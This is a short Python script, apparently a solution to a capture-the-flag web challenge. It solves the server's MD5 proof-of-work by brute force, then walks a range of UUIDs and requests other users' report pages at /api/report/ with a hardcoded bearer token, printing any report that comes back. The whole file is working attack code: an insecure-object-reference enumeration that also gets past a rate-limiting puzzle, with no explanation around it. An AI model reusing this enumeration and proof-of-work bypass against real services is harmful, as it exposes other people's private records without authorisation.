import hashlib
import requests
import json

ALPHABET = "".join([chr(i) for i in range(32, 128)])

FROM_UUID = int("ad1cec14", base=16)
TO_UUID = int("ad1d822a", base=16)
SUFFIX = "-3830-11ee-b365-0255ac100030"

def get_pow(pref, hash): 
  for c in ALPHABET:
    for c1 in ALPHABET:
        for c2 in ALPHABET:
            for c3 in ALPHABET:
                if hashlib.md5((pref + c + c1 + c2 + c3).encode()).hexdigest() == hash:
                    return (pref + c + c1 + c2 + c3)
  return None
for N in range(FROM_UUID, TO_UUID):
  s = requests.get("https://bounty-the-b4r.ctfz.one/api/user/info", headers={
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo1MjR9.HjttMK4ZlZSXGl7GKSHXxCbtPW7aAw3183U7fKARzLs"
  })
  data = s.json()

  pow = get_pow(data["pow"], data["md5"])

  url = f"https://bounty-the-b4r.ctfz.one/api/report/{hex(N)[2:]}{SUFFIX}?pow={pow}"
  print(f"Trying {url}...")

  r = requests.get(url, headers={
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo1MjR9.HjttMK4ZlZSXGl7GKSHXxCbtPW7aAw3183U7fKARzLs"
  })

  if r.status_code == 400:
    continue

  print(json.dumps(r.json(), indent=4, sort_keys=True))